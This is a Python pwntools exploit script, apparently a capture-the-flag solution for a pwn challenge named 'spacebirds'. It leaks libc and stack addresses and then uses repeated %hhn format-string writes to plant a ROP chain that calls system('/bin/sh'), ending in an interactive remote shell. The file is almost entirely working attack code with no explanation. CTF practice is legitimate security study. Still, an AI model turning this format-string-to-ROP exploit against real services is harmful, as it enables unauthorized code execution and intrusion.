#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 0
filename = "./pwn"
if LOCAL:
    io = process(filename)
else:
    io=remote("spaceheroes-pwn-spacebirds.chals.io", 443, ssl=True, sni="spaceheroes-pwn-spacebirds.chals.io")
elf = ELF(filename, checksec=False)
libc = ELF(elf.libc.path, checksec=False)


rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
ia = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass


ru(b"Serial Code: ")
libc_base = int(ru(b'\n', "drop"), 16) - libc.sym['rand']
lg("libc_base")

current_n = 0
def generate_hhn_payload(distance, hhn_data):
    global current_n
    offset = (distance // 8) + 6
    if hhn_data > current_n:
        temp = hhn_data - current_n
    elif hhn_data < current_n:
        temp = 0x100 - current_n + hhn_data
    elif hhn_data == current_n:
        return b"%" + i2b(offset) + b"$hhn"
    current_n = hhn_data
    return b"%" + i2b(temp) + b"c%" + i2b(offset) + b"$hhn"

#  guess_bit0 = int(input(), 16)
guess_bit0 = 0xa
ru(b'Report updated drone sightings in your area >>> ')
current_n = 0
payload = generate_hhn_payload(0x38, 0x76)
payload += b"%20$p"
payload = payload.ljust(0x38, b'\x00')
payload += p8( (guess_bit0<<4) + 8 )
#  payload += p8(0xa8)
s(payload)
ru(b'0x')
stack_base = int(ru(b'Space Birds Arent Real\n', "drop"), 16) - 0x90
lg("stack_base")

pop_rdi_ret = libc_base + 0x0000000000023b6a
binsh_addr  = libc_base + next(libc.search(b"/bin/sh\x00"))
system_addr = libc_base + libc.sym["system"]

ru(b'Report updated drone sightings in your area >>> ')
current_n = 0
payload = generate_hhn_payload(0x40, 0x76)
payload += generate_hhn_payload(0x48, ( (pop_rdi_ret >> 0x00) & 0xff ))
payload += generate_hhn_payload(0x50, ( (pop_rdi_ret >> 0x08) & 0xff ))
payload += generate_hhn_payload(0x58, ( (pop_rdi_ret >> 0x10) & 0xff ))
payload += generate_hhn_payload(0x60, ( (pop_rdi_ret >> 0x18) & 0xff ))
lg("len(payload)")
payload = payload.ljust(0x40, b'\x00')
payload += p64(stack_base+0x78)
payload += p64(stack_base+0x78 + 8)
payload += p64(stack_base+0x78 + 9)
payload += p64(stack_base+0x78 + 10)
payload += p64(stack_base+0x78 + 11)
s(payload)

ru(b'Report updated drone sightings in your area >>> ')
current_n = 0
payload = generate_hhn_payload(0x40, 0x76)
payload += generate_hhn_payload(0x48, ( (pop_rdi_ret >> 0x20) & 0xff ))
payload += generate_hhn_payload(0x50, ( (pop_rdi_ret >> 0x28) & 0xff ))
payload += generate_hhn_payload(0x58, ( (binsh_addr >> 0x00) & 0xff ))
payload += generate_hhn_payload(0x60, ( (binsh_addr >> 0x08) & 0xff ))
lg("len(payload)")
payload = payload.ljust(0x40, b'\x00')
payload += p64(stack_base+0x78)
payload += p64(stack_base+0x78 + 12)
payload += p64(stack_base+0x78 + 13)
payload += p64(stack_base+0x78 + 16 + 0)
payload += p64(stack_base+0x78 + 16 + 1)
s(payload)

ru(b'Report updated drone sightings in your area >>> ')
current_n = 0
payload = generate_hhn_payload(0x40, 0x76)
payload += generate_hhn_payload(0x48, ( (binsh_addr >> 0x10) & 0xff ))
payload += generate_hhn_payload(0x50, ( (binsh_addr >> 0x18) & 0xff ))
payload += generate_hhn_payload(0x58, ( (binsh_addr >> 0x20) & 0xff ))
payload += generate_hhn_payload(0x60, ( (binsh_addr >> 0x28) & 0xff ))
lg("len(payload)")
payload = payload.ljust(0x40, b'\x00')
payload += p64(stack_base+0x78)
payload += p64(stack_base+0x78 + 16 + 2)
payload += p64(stack_base+0x78 + 16 + 3)
payload += p64(stack_base+0x78 + 16 + 4)
payload += p64(stack_base+0x78 + 16 + 5)
s(payload)

ru(b'Report updated drone sightings in your area >>> ')
current_n = 0
payload = generate_hhn_payload(0x40, 0x76)
payload += generate_hhn_payload(0x48, ( (0) & 0xff ))
payload += generate_hhn_payload(0x50, ( (0) & 0xff ))
payload += generate_hhn_payload(0x58, ( (system_addr >> 0x00) & 0xff ))
payload += generate_hhn_payload(0x60, ( (system_addr >> 0x08) & 0xff ))
lg("len(payload)")
payload = payload.ljust(0x40, b'\x00')
payload += p64(stack_base+0x78)
payload += p64(stack_base+0x78 + 16 + 6)
payload += p64(stack_base+0x78 + 16 + 7)
payload += p64(stack_base+0x78 + 16 + 8)
payload += p64(stack_base+0x78 + 16 + 8 + 1)
s(payload)

ru(b'Report updated drone sightings in your area >>> ')
current_n = 0
payload = generate_hhn_payload(0x40, 0x76)
payload += generate_hhn_payload(0x48, ( (system_addr >> 0x10) & 0xff ))
payload += generate_hhn_payload(0x50, ( (system_addr >> 0x18) & 0xff ))
payload += generate_hhn_payload(0x58, ( (system_addr >> 0x20) & 0xff ))
payload += generate_hhn_payload(0x60, ( (system_addr >> 0x28) & 0xff ))
lg("len(payload)")
payload = payload.ljust(0x40, b'\x00')
payload += p64(stack_base+0x78)
payload += p64(stack_base+0x78 + 16 + 8 + 2)
payload += p64(stack_base+0x78 + 16 + 8 + 3)
payload += p64(stack_base+0x78 + 16 + 8 + 4)
payload += p64(stack_base+0x78 + 16 + 8 + 5)
s(payload)

ru(b'Report updated drone sightings in your area >>> ')
current_n = 0
payload = generate_hhn_payload(0x40, 0x95)
#  payload += generate_hhn_payload(0x48, ( (system_addr >> 0x10) & 0xff ))
#  payload += generate_hhn_payload(0x50, ( (system_addr >> 0x18) & 0xff ))
#  payload += generate_hhn_payload(0x58, ( (system_addr >> 0x20) & 0xff ))
#  payload += generate_hhn_payload(0x60, ( (system_addr >> 0x28) & 0xff ))
lg("len(payload)")
payload = payload.ljust(0x40, b'\x00')
payload += p64(stack_base+0x78)
#  payload += p64(stack_base+0x78 + 16 + 8 + 2)
#  payload += p64(stack_base+0x78 + 16 + 8 + 3)
#  payload += p64(stack_base+0x78 + 16 + 8 + 4)
#  payload += p64(stack_base+0x78 + 16 + 8 + 5)
s(payload)

ia()
